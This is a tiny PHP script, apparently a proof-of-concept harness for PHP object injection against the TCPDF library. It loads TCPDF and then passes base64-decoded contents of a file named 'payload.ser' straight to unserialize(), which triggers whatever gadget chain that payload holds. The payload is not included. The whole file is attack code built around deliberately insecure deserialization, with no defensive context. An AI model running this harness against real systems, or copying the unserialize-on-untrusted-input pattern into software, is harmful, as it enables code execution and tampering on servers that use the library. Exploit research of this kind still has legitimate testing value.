<?php
require_once('tcpdf_import.php');

unserialize(base64_decode(file_get_contents('./payload.ser')));
?>

